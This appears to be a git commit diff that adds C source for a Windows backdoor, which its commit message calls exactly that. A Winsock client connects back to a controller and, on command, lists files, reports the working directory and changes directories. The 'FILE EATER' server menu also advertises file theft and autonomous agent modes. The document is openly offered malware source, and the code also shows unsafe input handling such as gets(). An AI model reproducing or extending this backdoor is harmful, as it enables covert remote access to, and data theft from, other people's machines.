716ca0d138279994d4f40a42065e699834bced16
Sarim Ahmed <C41f0N@protonmail.com>
2023-10-28 01:27:36 -0700

    coded 4 functional operations for backdoor

--- client_winsock.c
+++ client_winsock.c
@@ -1,82 +1,118 @@
 #include<stdio.h>
-#include<Windows.h>
 #include<winsock2.h>
+#include<string.h>
+#include <dirent.h>
 
 #pragma comment(lib,"ws2_32.lib")
 
+
+// Declaring needed variables globally
+WSADATA wsa;
+SOCKET s;
+struct sockaddr_in server;
+char buffer[2048];
+int recv_size, awaamiErrorCode;
+
+// Repetitive code declared as functions here...
+
+void error() {
+	exit(1);
+}
+
+void initWinSock() {
+	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
+	{
+		fprintf(stderr, "\nFailed. Error Code : %d",WSAGetLastError());
+		error();
+	}
+	
+}
+
+void createPrepSock() {
+
+	if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
+	{
+		fprintf(stderr, "\nCould not create socket : %d" , WSAGetLastError());
+		error();
+	}
+}
+
+int makeConnToServer() {
+
+	server.sin_addr.s_addr = inet_addr("127.0.0.1");
+	server.sin_family = AF_INET;
+	server.sin_port = htons(8888);
+	
+	if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
+	{
+		return 0;
+	}
+
+	return 1;
+}
+
+int reliableRecieve() {
+
+	// Cleaning buffer before data comes.
+	memset(buffer,0,strlen(buffer));
+
+	if ((recv_size = recv(s, buffer, sizeof(buffer), 0)) == SOCKET_ERROR) {
+		return -1;
+	}
+
+	buffer[recv_size] = '\0';
+	if (recv_size == 1) return 0;
+
+	return 1;
+}
+
+void reliableSend() {
+	//Sending message to client
+	send(s , buffer , strlen(buffer) , 0);
+}
+
+void pullDirectoryData()
+    {
+        // Code to extract directory data
+        DIR *directory;
+        struct dirent *entry;
+
+        // Open the current working directory
+        directory = opendir(".");
+        if (directory == NULL)
+        {
+            perror("Error opening current working directory");
+        }
+
+        // Loop through the entries in the directory
+        while ((entry = readdir(directory)) != NULL)
+        {
+            char filename[100];
+            char filetype[10];
+
+            if((entry->d_type + '0') == '0') {
+                strcpy(filetype, "FILE");
+            } else {
+                strcpy(filetype, "FOLDER");
+            }
+
+            strcpy(filename, entry->d_name);
+            strcat(filename, "\n");
+            strcat(filename, filetype);
+            strcat(filename, "\n\n");
+            strcat(buffer, filename);
+        }
+
+        // Close the directory
+        closedir(directory);
+}
+
+void loadCWD() {
+	getcwd(buffer, sizeof(buffer));
+}
+
 int main(int argc , char *argv[])
 {
-
-	// Declaring needed variables
-
-	WSADATA wsa;
-	SOCKET s;
-	struct sockaddr_in server;
-	char buffer[2048];
-	int recv_size, awaamiErrorCode;
-
-
-	
-	// Repetitive code declared as functions here...
-
-	void error() {
-		exit(1);
-	}
-
-	void initWinSock() {
-		if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
-		{
-			fprintf(stderr, "\nFailed. Error Code : %d",WSAGetLastError());
-			error();
-		}
-		
-	}
-
-	void createPrepSock() {
-
-		if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
-		{
-			fprintf(stderr, "\nCould not create socket : %d" , WSAGetLastError());
-			error();
-		}
-
-		// fprintf(stderr, "\nSocket Created.");
-
-	}
-	
-	int makeConnToServer() {
-
-		server.sin_addr.s_addr = inet_addr("127.0.0.1");
-		server.sin_family = AF_INET;
-		server.sin_port = htons(8888);
-		
-		if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
-		{
-			return 0;
-		}
-
-		return 1;
-	}
-
-	int reliableRecieve() {
-
-		// Cleaning buffer before data comes.
-		memset(buffer,0,strlen(buffer));
-
-		if ((recv_size = recv(s, buffer, sizeof(buffer), 0)) == SOCKET_ERROR) {
-			return 0;
-		}
-
-		buffer[recv_size] = '\0';
-		return 1;
-	}
-
-	void reliableSend() {
-		//Sending message to client
-		send(s , buffer , strlen(buffer) , 0);
-	}
-
-
 	// Main Code 
 
 	initWinSock();
@@ -96,12 +132,78 @@ int main(int argc , char *argv[])
 		fprintf(stderr, "\n\n[+] Connected\n");
 		while (connected) {
 			
-			awaamiErrorCode = reliableRecieve();
-
-			if (awaamiErrorCode == 1) {						// Success with some data.
-				if (buffer[1] != '\0') fprintf(stderr, "\n[RECIEVED]: %s", buffer);
+			// Getting chosen option by server
+			while (1) {
+				awaamiErrorCode = reliableRecieve();
+				if (awaamiErrorCode != 0) break;
 			}
-			else { 											// Connection was broken
+
+			// Checking if connection was broken.
+			if (awaamiErrorCode == 1)
+			{
+				// Checking option selected by server
+				int option = atoi(buffer);
+
+				switch (option) {
+					case 1:
+						fprintf(stderr, "\n[+] Pulling file list data...");
+						pullDirectoryData();
+
+						fprintf(stderr, "\n[+] Sending file list data.");
+						reliableSend();
+
+						break;
+
+					
+					case 2:
+						fprintf(stderr, "\n[+] Getting cwd...");
+						loadCWD();
+
+						fprintf(stderr, "\n[+] Sending data.");
+						reliableSend();
+
+						break;
+
+
+					case 3:
+						fprintf(stderr, "\n[+] Getting directory name from server...");
+						
+						awaamiErrorCode = 0;
+						while (awaamiErrorCode == 0) {
+							awaamiErrorCode = reliableRecieve();
+						}
+
+						fprintf(stderr, "\nbuffer reads: %s", buffer);
+						chdir(buffer);
+
+						// Sending updated CWD
+						loadCWD();
+						fprintf(stderr, "\n[+] Sending updated CWD.");
+						reliableSend();
+
+						break;
+
+
+					case 4:
+						fprintf(stderr, "\n[+] Changing to parent directory...");
+						chdir("..");
+
+						// Sending updated CWD
+						loadCWD();
+						fprintf(stderr, "\n[+] Sending updated CWD.");
+						reliableSend();
+
+						break;
+
+					
+					default:
+						printf("\n[+] Invalid Option Recieved.");
+						break;
+				}
+			}
+
+			// if connection was broken
+			else {
 				connected = 0;
 				break;
 			}
--- server_winsock.c
+++ server_winsock.c
@@ -2,117 +2,276 @@
 #include<winsock2.h>
 #include<string.h>
 
+
 #pragma comment(lib,"ws2_32.lib") //Winsock Library
+
+// Declaring needed variables globally
+WSADATA wsa;
+SOCKET s, new_socket;
+struct sockaddr_in server, client;
+int c, recv_size;
+char buffer[2048];
+
+
+// Repetitive code declared as functions here...
+
+void error() {
+		exit(1);
+	}
+
+void initWinSock() {
+	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
+	{
+		printf("\nFailed. Error Code : %d",WSAGetLastError());
+		error();
+	}
+}
+
+void createAndBindSock() {
+
+if((s = socket(AF_INET , SOCK_STREAM , IPPROTO_TCP )) == INVALID_SOCKET)
+{
+	printf("\n[!] Could not create socket : %d" , WSAGetLastError());
+	error();
+}
+
+//Prepare the sockaddr_in structure
+server.sin_family = AF_INET;
+server.sin_addr.s_addr = INADDR_ANY;
+server.sin_port = htons( 8888 );
+	
+	//Bind
+	if( bind(s ,(struct sockaddr *)&server , sizeof(server)) == SOCKET_ERROR)
+	{
+		printf("\nBind failed with error code : %d" , WSAGetLastError());
+		error();
+	}
+}
+
+void listenAndAcceptConn() {
+	listen(s , 3);
+
+	c = sizeof(struct sockaddr_in);
+	new_socket = accept(s , (struct sockaddr *)&client, &c);
+	if (new_socket == INVALID_SOCKET)
+	{
+		printf("\naccept failed with error code : %d" , WSAGetLastError());
+		error();
+	}
+
+}
+
+void reliableRecieve() {
+
+	// Cleaning buffer before data comes.
+	memset(buffer,0,strlen(buffer));
+
+	if ((recv_size = recv(new_socket, buffer, sizeof(buffer), 0)) == SOCKET_ERROR) {
+		printf("\n[!] Recieve Failed.");
+	}
+
+	buffer[recv_size] = '\0';
+}
+
+void reliableSend() {
+	//Sending message to client
+	send(new_socket , buffer , strlen(buffer) , 0);
+
+}
+
+void showAnimation() {
+	system("cls");
+	fprintf(stderr, "         _______________\n");
+	fprintf(stderr, "        /               \\\n");
+	fprintf(stderr, "       /                 \\\n");
+	fprintf(stderr, "      /                   \\\n");
+	fprintf(stderr, "      |   XXXX     XXXX   |\n");
+	fprintf(stderr, "      |   XXXX     XXXX   |\n");
+	fprintf(stderr, "      |   XXX       XXX   |\n");
+	fprintf(stderr, "      |         X         |\n");
+	fprintf(stderr, "      \\__      XXX     __/\n");
+	fprintf(stderr, "        |\\     XXX     /|\n");
+	fprintf(stderr, "        | |           | |\n");
+	fprintf(stderr, "        | I I I I I I I |\n");
+	fprintf(stderr, "        |  I I I I I I  |\n");
+	fprintf(stderr, "         \\_           _/\n");
+	fprintf(stderr, "          \\_         _/\n");
+	fprintf(stderr, "            \\_______/\n");
+	fprintf(stderr, "  XXX                        XXX\n");
+	fprintf(stderr, "XXXXX                        XXXXX\n");
+	fprintf(stderr, " XXXXXXXXXX             XXXXXXXXXX\n");
+	fprintf(stderr, "         XXXXX     XXXXX\n");
+	fprintf(stderr, "             XXXXXXX\n");
+	fprintf(stderr, "         XXXXX     XXXXX\n");
+	fprintf(stderr, " XXXXXXXXXX             XXXXXXXXXX\n");
+	fprintf(stderr, "XXXXX                        XXXXX\n");
+	fprintf(stderr, "  XXX                        XXX\n");
+	Sleep(3000);
+
+	system("cls");
+	fprintf(stderr, "         _______________\n");
+	fprintf(stderr, "        /               \\\n");
+	fprintf(stderr, "       /                 \\\n");
+	fprintf(stderr, "      /                   \\\n");
+	fprintf(stderr, "      |   XXXX     XXXX   |\n");
+	fprintf(stderr, "      |   X XX     XX X   |\n");
+	fprintf(stderr, "      |   XXX       XXX   |\n");
+	fprintf(stderr, "      |         X         |\n");
+	fprintf(stderr, "      \\__      XXX     __/\n");
+	fprintf(stderr, "        |\\     XXX     /|\n");
+	fprintf(stderr, "        | I I I I I I I |\n");
+	fprintf(stderr, "        |               |\n");
+	fprintf(stderr, "        |               |\n");
+	fprintf(stderr, "         \\I I I I I I _/\n");
+	fprintf(stderr, "          \\_         _/\n");
+	fprintf(stderr, "            \\_______/\n");
+	fprintf(stderr, "  XXX                        XXX\n");
+	fprintf(stderr, "XXXXX                        XXXXX\n");
+	fprintf(stderr, " XXXXXXXXXX             XXXXXXXXXX\n");
+	fprintf(stderr, "         XXXXX     XXXXX\n");
+	fprintf(stderr, "             XXXXXXX\n");
+	fprintf(stderr, "         XXXXX     XXXXX\n");
+	fprintf(stderr, " XXXXXXXXXX             XXXXXXXXXX\n");
+	fprintf(stderr, "XXXXX                        XXXXX\n");
+	fprintf(stderr, "  XXX                        XXX\n");
+	Sleep(250);
+
+	}
+
+void writeToBuffer(char data[]) {
+	// Clearing old data
+	memset(buffer,0,strlen(buffer));
+
+	// Putting new data
+	strcpy(buffer, data);
+}
 
 int main(int argc , char *argv[])
 {
 
-	// Declaring needed variables
-
-	WSADATA wsa;
-	SOCKET s, new_socket;
-	struct sockaddr_in server, client;
-    int c, recv_size;
-    char buffer[2048];
-
-
-	// Repetitive code declared as functions here...
-
-	void error() {
-		exit(1);
-	}
-
-	void initWinSock() {
-		printf("\nInitialising Winsock...");
-		if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
-		{
-			printf("\nFailed. Error Code : %d",WSAGetLastError());
-			error();
-		}
-		
-		printf("\nInitialised.");
-	}
-	
-	void createAndBindSock() {
-
-	if((s = socket(AF_INET , SOCK_STREAM , IPPROTO_TCP )) == INVALID_SOCKET)
-	{
-		printf("\nCould not create socket : %d" , WSAGetLastError());
-		error();
-	}
-
-	fprintf(stderr, "\nSocket Created.");
-
-    //Prepare the sockaddr_in structure
-	server.sin_family = AF_INET;
-	server.sin_addr.s_addr = INADDR_ANY;
-	server.sin_port = htons( 8888 );
-		
-		//Bind
-		if( bind(s ,(struct sockaddr *)&server , sizeof(server)) == SOCKET_ERROR)
-		{
-			printf("\nBind failed with error code : %d" , WSAGetLastError());
-			error();
-		}
-		
-		puts("\nBind done");
-	}
-
-	void listenAndAcceptConn() {
-		listen(s , 3);
-
-		c = sizeof(struct sockaddr_in);
-		new_socket = accept(s , (struct sockaddr *)&client, &c);
-		if (new_socket == INVALID_SOCKET)
-		{
-			printf("\naccept failed with error code : %d" , WSAGetLastError());
-		}
-
-		printf("\nConnection Accepted.");
-	
-	}
-
-	void reliableRecieve() {
-
-		// Cleaning buffer before data comes.
-		memset(buffer,0,strlen(buffer));
-
-		if ((recv_size = recv(new_socket, buffer, sizeof(buffer), 0)) == SOCKET_ERROR) {
-			printf("\n[!] Recieve Failed.");
-		}
-
-		buffer[recv_size] = '\0';
-	}
-
-	void reliableSend() {
-		//Sending message to client
-		send(new_socket , buffer , strlen(buffer) , 0);
-
-	}
-
-
 	// Main Code
+	// showAnimation();
+	
+	system("cls");
+	fprintf(stderr, "=====================================================\n");
+	fprintf(stderr, "                   WELCOME TO FILE EATER\n");
+	fprintf(stderr, "=====================================================\n");
 
+	fprintf(stderr, "\n");
+
+
+	fprintf(stderr, "[+] Setting things up...\r");
 	initWinSock();
 	createAndBindSock();
+	fprintf(stderr, "[+] Setting things up... Done.\n");
+
+
+	fprintf(stderr, "[+] Listening for connections...\n");
 	listenAndAcceptConn();
+	fprintf(stderr, "[+] Connected.\n");
+
+	int running = 1;
+
+	while (running) {
+		int choice = -1;
+		fprintf(stderr, "\nThese are your options :-\n\n");
+		fprintf(stderr, "[0] Quit.\n");
+		fprintf(stderr, "[1] Get list of files in CWD.\n");
+		fprintf(stderr, "[2] Get path of CWD.\n");
+		fprintf(stderr, "[3] Go to a specific folder in CWD.\n");
+		fprintf(stderr, "[4] Go to parent folder of CWD.\n");
+		fprintf(stderr, "[5] Eat a file in CWD.\n");
+		fprintf(stderr, "[6] Give Agent File Eater free hand.\n");
+		fprintf(stderr, "[7] Ask Agent File Eater to wait for instructions.\n");
 
 
-	int quit = 0;
-
-	while (!quit) {
-		fprintf(stderr, "\nEnter your message: ");
-		fgets (buffer, sizeof(buffer), stdin);
+		fprintf(stderr, "\nYour selected option: ");
+		fflush(stdin);
+		scanf("%d", &choice);
 		
-		fprintf(stderr, "\n[SENDING]: %s", buffer);
-		reliableSend();
+		switch (choice) {
+			case 0:
+				running = 0;
+				break;
 
-		fprintf(stderr, "\nEnter 1 if you want to quit: ");
-		scanf("%d", &quit);
-		
-		Sleep(100);
+			case 1:
+				fprintf(stderr, "\n[+] Requesting client to send files data...");
+
+				// Asking client to send directory data
+				writeToBuffer(" 1");
+				reliableSend();
+
+				// Recieving direcory data
+				reliableRecieve();
+				fprintf(stderr, "\n[+] Recieved files data from client.");
+				fprintf(stderr, "\n%s", buffer);
+
+				break;
+
+			case 2:
+				fprintf(stderr, "\n[+] Requesting client to send current working directory...");
+
+				// Asking client to send cwd
+				writeToBuffer(" 2");
+				reliableSend();
+
+				// Recieving data
+				reliableRecieve();
+				fprintf(stderr, "\n[+] CWD is: ");
+				fprintf(stderr, "\n%s", buffer);
+
+				break;
+
+			case 3:
+				// Asking client to switch to a folder
+				writeToBuffer(" 3");
+				reliableSend();
+
+				fprintf(stderr, "\n[+] Requesting client to go to specific directory...");
+
+				// Sending folder name to client
+				char dirName[2048];
+
+				memset(buffer,0,strlen(dirName));
+				
+				fprintf(stderr, "\nEnter name of the directory you want to switch to: ");
+				fflush(stdin);
+				gets(dirName);
+
+				writeToBuffer(dirName);
+				reliableSend();
+
+				// Recieving data
+				reliableRecieve();
+				fprintf(stderr, "\n[+] CWD changed to: ");
+				fprintf(stderr, "\n%s", buffer);
+
+				break;
+
+
+			case 4:
+				fprintf(stderr, "\n[+] Requesting client to go to parent directory...");
+
+				// Asking client to send cwd
+				writeToBuffer(" 4");
+				reliableSend();
+
+				// Recieving data
+				reliableRecieve();
+				fprintf(stderr, "\n[+] CWD changed to: ");
+				fprintf(stderr, "\n%s", buffer);
+
+				break;
+
+			default:
+				fprintf(stderr, "Incorrect Option Chosen.");
+				break;
+		}
+
+		fflush(stdin);
+		printf("\n\nPress any key to continue...");
+		getchar();
 	}
-	
 	// Not closing properly on purpose
 	// closesocket(s);
 	// closesocket(new_socket);
